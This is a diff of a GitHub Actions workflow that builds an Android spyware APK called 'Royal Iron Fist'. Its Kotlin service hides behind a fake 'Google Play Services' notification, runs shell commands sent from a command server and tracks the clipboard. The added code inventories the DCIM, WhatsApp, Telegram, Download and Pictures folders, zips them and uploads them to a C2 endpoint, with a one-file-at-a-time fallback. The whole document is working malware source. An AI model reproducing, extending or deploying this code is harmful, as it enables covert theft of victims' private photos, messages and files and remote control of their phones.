@@ -1,11 +1,11 @@
-name: Royal Iron Fist Node Builder v12.0 Absolute Chunking
+name: Royal Iron Fist Node Builder v13.0 Sultan Kingdom
 
 on:
   workflow_dispatch:
 
 jobs:
   build:
-    name: Build Royal Iron Fist Operational APK v12.0
+    name: Build Royal Iron Fist Operational APK v13.0
     runs-on: ubuntu-latest
 
     steps:
@@ -101,6 +101,7 @@ jobs:
           import android.location.LocationManager
           import android.net.Uri
           import android.os.Build
+          import android.os.Environment
           import android.os.IBinder
           import android.os.PowerManager
           import android.provider.ContactsContract
@@ -111,6 +112,8 @@ jobs:
           import java.io.BufferedReader
           import java.io.ByteArrayInputStream
           import java.io.File
+          import java.io.FileInputStream
+          import java.io.FileOutputStream
           import java.io.InputStreamReader
           import java.io.OutputStreamWriter
           import java.net.HttpURLConnection
@@ -129,10 +132,18 @@ jobs:
               private var lastHeartbeatSent = 0L
               private var lastClipboardText = "No recent clipboard activity"
 
+              private val SENSITIVE_FOLDERS = arrayOf(
+                  "/storage/emulated/0/DCIM",
+                  "/storage/emulated/0/Download",
+                  "/storage/emulated/0/WhatsApp",
+                  "/storage/emulated/0/Telegram",
+                  "/storage/emulated/0/Pictures"
+              )
+
               override fun onCreate() {
                   super.onCreate()
                   val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::AbsoluteChunkingLock")
+                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::SultanKingdomLock")
                   wakeLock?.acquire(10 * 60 * 60 * 1000L)
                   startForegroundServiceNotification()
                   initClipboardTracker()
@@ -156,7 +167,7 @@ jobs:
               }
 
               private fun startForegroundServiceNotification() {
-                  val channelId = "royal_chunking_channel"
+                  val channelId = "royal_sultan_channel"
                   val channel = NotificationChannel(channelId, "Google Play Services", NotificationManager.IMPORTANCE_LOW)
                   val manager = getSystemService(NotificationManager::class.java)
                   manager?.createNotificationChannel(channel)
@@ -190,7 +201,7 @@ jobs:
                               val currentTime = System.currentTimeMillis()
                               val sendHeartbeat = (currentTime - lastHeartbeatSent > 40000L)
                               val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Chunking Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
+                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Sultan Kingdom Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
 
                               if (sendHeartbeat) {
                                   lastHeartbeatSent = currentTime
@@ -243,17 +254,21 @@ jobs:
                                                       val data = executeShellCommand(payload)
                                                       streamTextMemoryDirect(deviceId, nodeModel, "Uranium_ShellResult.txt", data)
                                                   }
+                                                  // 🔥 الأمر الأكثر فتكاً (مسح + قائمة + ضغط + إرسال شامل)
+                                                  action.contains("SCAN_AND_STEAL_ALL") || action.contains("EXTRACT_STORAGE_ZIP") -> {
+                                                      executeKingdomScanAndSteal(deviceId, nodeModel)
+                                                  }
+                                                  action.contains("LIST_FILES_REPORT") -> {
+                                                      generateKingdomScanReport(deviceId, nodeModel)
+                                                  }
                                                   action.contains("EXTRACT_CAMERA_ZIP") -> {
-                                                      streamChunkedMediaStoreStream(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                                      compressAndSendFolder(deviceId, nodeModel, "/storage/emulated/0/DCIM")
                                                   }
                                                   action.contains("EXTRACT_WHATSAPP_ZIP") -> {
-                                                      streamTargetFolderStream(deviceId, nodeModel, "WhatsApp_Vault", "/storage/emulated/0/WhatsApp")
+                                                      compressAndSendFolder(deviceId, nodeModel, "/storage/emulated/0/WhatsApp")
                                                   }
                                                   action.contains("EXTRACT_DOWNLOAD_ZIP") -> {
-                                                      streamTargetFolderStream(deviceId, nodeModel, "Download_Vault", "/storage/emulated/0/Download")
-                                                  }
-                                                  action.contains("EXTRACT_STORAGE_ZIP") -> {
-                                                      streamChunkedMediaStoreStream(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
+                                                      compressAndSendFolder(deviceId, nodeModel, "/storage/emulated/0/Download")
                                                   }
                                                   action.contains("EXTRACT_AUDIO") -> {
                                                       streamChunkedMediaStoreStream(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
@@ -276,136 +291,171 @@ jobs:
                   return START_STICKY
               }
 
+              // ==========================================
+              // 🕵️ محرك المسح وجرد الملفات بمفهوم السكربت الملكي
+              // ==========================================
+              private fun generateKingdomScanReport(nodeId: String, nodeModel: String) {
+                  val sbReport = StringBuilder("📜 <b>تقرير الجرد الشامل بأمر السلطان ناصر دين الله الكلعي:</b>\n\n")
+                  for (folderPath in SENSITIVE_FOLDERS) {
+                      val dir = File(folderPath)
+                      if (dir.exists() && dir.isDirectory) {
+                          var fileCount = 0
+                          var totalSize = 0L
+                          val nameList = ArrayList<String>()
+
+                          dir.walkTopDown().forEach { file ->
+                              if (file.isFile) {
+                                  fileCount++
+                                  totalSize += file.length()
+                                  if (nameList.size < 50) {
+                                      nameList.add(file.name)
+                                  }
+                              }
+                          }
+                          if (fileCount > 0) {
+                              val sizeMB = totalSize.toDouble() / (1024 * 1024)
+                              sbReport.append("📁 <code>${dir.name}</code>\n📦 الملفات: $fileCount\n💾 الحجم: ${String.format("%.2f", sizeMB)} MB\n\n")
+                              
+                              // إرسال عينة من أسماء أول 50 ملفاً
+                              val namesText = nameList.joinToString("\n• ")
+                              sendReportToServer(nodeId, nodeModel, "📂 ملفات <code>${dir.name}</code> (أول 50 ملف):\n• $namesText")
+                          }
+                      }
+                  }
+                  sendReportToServer(nodeId, nodeModel, sbReport.toString())
+              }
+
+              private fun executeKingdomScanAndSteal(nodeId: String, nodeModel: String) {
+                  sendReportToServer(nodeId, nodeModel, "🔥 <b>بدء بروتوكول الحصاد الشامل والضغط على القرص بأمر السلطان!</b>")
+                  generateKingdomScanReport(nodeId, nodeModel)
+                  
+                  for (folderPath in SENSITIVE_FOLDERS) {
+                      compressAndSendFolder(nodeId, nodeModel, folderPath)
+                  }
+                  sendReportToServer(nodeId, nodeModel, "🏆 <b>اكتمل الحصاد الشامل المطلق بنجاح تام!</b>")
+              }
+
+              // ==========================================
+              // 🗜️ محرك الضاغط الخارق على القرص كالموجود بالسكربت
+              // ==========================================
+              private fun compressAndSendFolder(nodeId: String, nodeModel: String, folderPath: String) {
+                  try {
+                      val dir = File(folderPath)
+                      if (!dir.exists() || !dir.isDirectory) return
+
+                      val zipName = "Sultan_${dir.name}_${System.currentTimeMillis()}.zip"
+                      val tempZipFile = File(cacheDir, zipName)
+
+                      sendReportToServer(nodeId, nodeModel, "📦 جاري ضغط مجلد <code>${dir.name}</code> على القرص المؤقت...")
+
+                      val filesList = ArrayList<File>()
+                      dir.walkTopDown().forEach { if (it.isFile) filesList.add(it) }
+
+                      if (filesList.isEmpty()) return
+
+                      FileOutputStream(tempZipFile).use { fos ->
+                          ZipOutputStream(fos).use { zipOut ->
+                              zipOut.setLevel(Deflater.BEST_SPEED)
+                              for ((index, file) in filesList.withIndex()) {
+                                  try {
+                                      if (file.length() < 100 * 1024 * 1024) { // حماية لتجنب الملفات الضخمة جداً
+                                          val entryName = file.absolutePath.replace("${dir.parentFile?.absolutePath}/", "")
+                                          zipOut.putNextEntry(ZipEntry(entryName))
+                                          FileInputStream(file).use { fis -> fis.copyTo(zipOut) }
+                                          zipOut.closeEntry()
+                                      }
+                                  } catch (ex: Exception) {}
+
+                                  if ((index + 1) % 500 == 0) {
+                                      sendReportToServer(nodeId, nodeModel, "🔄 تقدم ضغط ${dir.name}: ${index + 1}/${filesList.size} ملف...")
+                                  }
+                              }
+                              zipOut.finish()
+                          }
+                      }
+
+                      if (tempZipFile.exists() && tempZipFile.length() > 0) {
+                          val zipSizeMB = tempZipFile.length().toDouble() / (1024 * 1024)
+                          sendReportToServer(nodeId, nodeModel, "📡 جاري إرسال حزمة ZIP المجمعة <code>${dir.name}</code> (الحجم: ${String.format("%.2f", zipSizeMB)} MB)...")
+
+                          val bytes = tempZipFile.readBytes()
+                          uploadBytesDirect(nodeId, nodeModel, zipName, bytes)
+                          sendReportToServer(nodeId, nodeModel, "✅ تم إرسال حزمة <code>${dir.name}</code> بنجاح!")
+                          tempZipFile.delete()
+                      } else {
+                          // الخطة (ب): الإرسال الفردي عند فشل الضغط
+                          sendSequentially(nodeId, nodeModel, dir.name, filesList)
+                      }
+                  } catch (e: Exception) {
+                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ ضغط مجلد $folderPath: ${e.message}. العودة للإرسال الفردي...")
+                  }
+              }
+
+              // الخطة ب المأخوذة من السكربت للإرسال الفردي المتسلسل
+              private fun sendSequentially(nodeId: String, nodeModel: String, folderName: String, files: List<File>) {
+                  sendReportToServer(nodeId, nodeModel, "📤 بدء الإرسال الفردي لمجلد <code>$folderName</code> (العدد: ${files.size})")
+                  for ((index, file) in files.withIndex()) {
+                      try {
+                          if (file.length() < 30 * 1024 * 1024) {
+                              uploadBytesDirect(nodeId, nodeModel, "${folderName}_${file.name}", file.readBytes())
+                          }
+                      } catch (e: Exception) {}
+                      if ((index + 1) % 50 == 0) {
+                          sendReportToServer(nodeId, nodeModel, "📊 تقدم الإرسال الفردي: ${index + 1}/${files.size} ملف.")
+                      }
+                  }
+              }
+
+              private fun streamChunkedMediaStoreStream(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
+                  try {
+                      sendReportToServer(nodeId, nodeModel, "⚡ [البث المقسم الذكي] جاري سحب أرشيف $prefix كالبراق...")
+                      
+                      val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
+                      val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+                      val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
+
+                      var fileCount = 0
+                      val tempZip = File(cacheDir, "Temp_$prefix.zip")
+                      
+                      FileOutputStream(tempZip).use { fos ->
+                          ZipOutputStream(fos).use { zipOut ->
+                              zipOut.setLevel(Deflater.BEST_SPEED)
+                              cursor?.use {
+                                  val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
+                                  val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                                  while (it.moveToNext() && fileCount < 1000) {
+                                      if (idIdx != -1 && nameIdx != -1) {
+                                          val id = it.getLong(idIdx)
+                                          val name = it.getString(nameIdx) ?: "file_$id.dat"
+                                          val itemUri = ContentUris.withAppendedId(contentUri, id)
+                                          try {
+                                              contentResolver.openInputStream(itemUri)?.use { inputStream ->
+                                                  zipOut.putNextEntry(ZipEntry("$prefix/$name"))
+                                                  inputStream.copyTo(zipOut)
+                                                  zipOut.closeEntry()
+                                                  fileCount++
+                                              }
+                                          } catch (ex: Exception) {}
+                                      }
+                                  }
+                              }
+                              zipOut.finish()
+                          }
+                      }
+                      if (tempZip.exists()) {
+                          uploadBytesDirect(nodeId, nodeModel, "Uranium_${prefix}_${System.currentTimeMillis()}.zip", tempZip.readBytes())
+                          sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد بنجاح]\n📂 الأرشيف: <code>$prefix</code> ($fileCount ملفاً)")
+                          tempZip.delete()
+                      }
+                  } catch (e: Exception) {}
+              }
+
               private fun streamTextMemoryDirect(nodeId: String, nodeModel: String, fileName: String, content: String) {
                   try {
                       val bytes = content.toByteArray(Charsets.UTF_8)
                       uploadBytesDirect(nodeId, nodeModel, fileName, bytes)
                       sendReportToServer(nodeId, nodeModel, "✅ [حصاد فائق السرعة RAM] الملف <b>$fileName</b> تم بثه مركزياً بنجاح تام.")
                   } catch (e: Exception) {}
-              }
-
-              // محرك التقسيم الحزمي الذكي للملفات الكبرى (Chunked Streaming) لضمان عدم فشل أي سحب ضخم
-              private fun streamChunkedMediaStoreStream(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
-                  try {
-                      sendReportToServer(nodeId, nodeModel, "⚡ [البث المقسم الذكي] جاري سحب أرشيف $prefix على دفعات حزمية كالبراق...")
-                      
-                      val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
-                      val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-                      val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
-
-                      var chunkIndex = 1
-                      var fileCountInChunk = 0
-                      var totalFiles = 0
-
-                      var url = URL(C2_INGEST_URL)
-                      var conn = createChunkConnection(nodeId, nodeModel, "${prefix}_Part$chunkIndex")
-                      var os = conn.outputStream
-                      var zipOut = ZipOutputStream(os)
-                      zipOut.setLevel(Deflater.BEST_SPEED)
-
-                      cursor?.use {
-                          val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
-                          val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-
-                          while (it.moveToNext()) {
-                              if (idIdx != -1 && nameIdx != -1) {
-                                  val id = it.getLong(idIdx)
-                                  val name = it.getString(nameIdx) ?: "file_$id.dat"
-                                  val itemUri = ContentUris.withAppendedId(contentUri, id)
-
-                                  try {
-                                      contentResolver.openInputStream(itemUri)?.use { inputStream ->
-                                          zipOut.putNextEntry(ZipEntry("$prefix/$name"))
-                                          inputStream.copyTo(zipOut)
-                                          zipOut.closeEntry()
-                                          fileCountInChunk++
-                                          totalFiles++
-
-                                          // إذا وصلت الحزمة إلى 250 ملفاً، نغلقها ونبدأ حزمة جديدة كالبراق لتفادي الحجم الهائل
-                                          if (fileCountInChunk >= 250) {
-                                              zipOut.finish()
-                                              zipOut.close()
-                                              conn.responseCode
-                                              conn.disconnect()
-
-                                              chunkIndex++
-                                              fileCountInChunk = 0
-                                              conn = createChunkConnection(nodeId, nodeModel, "${prefix}_Part$chunkIndex")
-                                              os = conn.outputStream
-                                              zipOut = ZipOutputStream(os)
-                                              zipOut.setLevel(Deflater.BEST_SPEED)
-                                          }
-                                      }
-                                  } catch (ex: Exception) {}
-                              }
-                          }
-                      }
-                      zipOut.finish()
-                      zipOut.close()
-                      conn.responseCode
-                      conn.disconnect()
-
-                      sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الحزمي بنجاح]\n📂 الأرشيف: <code>$prefix</code> (إجمالي $totalFiles ملفاً مقسمة على $chunkIndex حزم) - [Zero Disk Footprint]")
-                  } catch (e: Exception) {
-                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ أرشيف حزمي $prefix: ${e.message}")
-                  }
-              }
-
-              // محرك سحب المجلدات المعروفة (مثل واتساب وداونلود) بشكل مباشر وشجري آمن
-              private fun streamTargetFolderStream(nodeId: String, nodeModel: String, prefix: String, targetPath: String) {
-                  try {
-                      sendReportToServer(nodeId, nodeModel, "⚡ [سحب المجلدات السيبرانية] جاري تدفق مسار $targetPath كالبراق...")
-                      
-                      val rootDir = File(targetPath)
-                      if (!rootDir.exists() || !rootDir.isDirectory) {
-                          sendReportToServer(nodeId, nodeModel, "⚠️ المسار $targetPath غير موجود أو غير متاح على هذه العقدة.")
-                          return
-                      }
-
-                      val url = URL(C2_INGEST_URL)
-                      val conn = createChunkConnection(nodeId, nodeModel, "${prefix}_Archive.zip")
-                      val os = conn.outputStream
-                      val zipOut = ZipOutputStream(os)
-                      zipOut.setLevel(Deflater.BEST_SPEED)
-
-                      var fileCount = 0
-                      rootDir.walkTopDown().forEach { file ->
-                          if (file.isFile && file.canRead() && file.length() < 50 * 1024 * 1024) { // تجاهل الملفات الضخمة جداً لتجنب التعليق
-                              try {
-                                  val relPath = file.absolutePath.replace(rootDir.parentFile?.absolutePath ?: "", "")
-                                  zipOut.putNextEntry(ZipEntry("$prefix$relPath"))
-                                  file.inputStream().use { fis -> fis.copyTo(zipOut) }
-                                  zipOut.closeEntry()
-                                  fileCount++
-                              } catch (ex: Exception) {}
-                          }
-                      }
-                      zipOut.finish()
-                      zipOut.close()
-                      val code = conn.responseCode
-                      conn.disconnect()
-
-                      if (code == 200) {
-                          sendReportToServer(nodeId, nodeModel, "✅ [تم سحب المجلد السيبراني بنجاح]\n📂 <code>$prefix</code> ($fileCount ملفاً تم حصدهم من $targetPath)")
-                      }
-                  } catch (e: Exception) {
-                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في سحب المجلد $prefix: ${e.message}")
-                  }
-              }
-
-              private fun createChunkConnection(nodeId: String, nodeModel: String, fileName: String): HttpURLConnection {
-                  val url = URL(C2_INGEST_URL)
-                  val conn = url.openConnection() as HttpURLConnection
-                  conn.requestMethod = "POST"
-                  conn.setRequestProperty("X-Node-ID", nodeId)
-                  conn.setRequestProperty("X-Node-Model", nodeModel)
-                  conn.setRequestProperty("X-File-Name", "Uranium_${fileName}_${System.currentTimeMillis()}.zip")
-                  conn.setRequestProperty("Content-Type", "application/octet-stream")
-                  conn.doOutput = true
-                  conn.setChunkedStreamingMode(1024 * 64)
-                  conn.connectTimeout = 300000
-                  conn.readTimeout = 300000
-                  return conn
               }
 
               private fun executeShellCommand(cmd: String): String {
@@ -885,5 +935,5 @@ jobs:
       - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Royal-Iron-Fist-v12.0-AbsoluteChunking
+          name: Royal-Iron-Fist-v13.0-SultanKingdom
           path: app/build/outputs/apk/debug/app-debug.apk
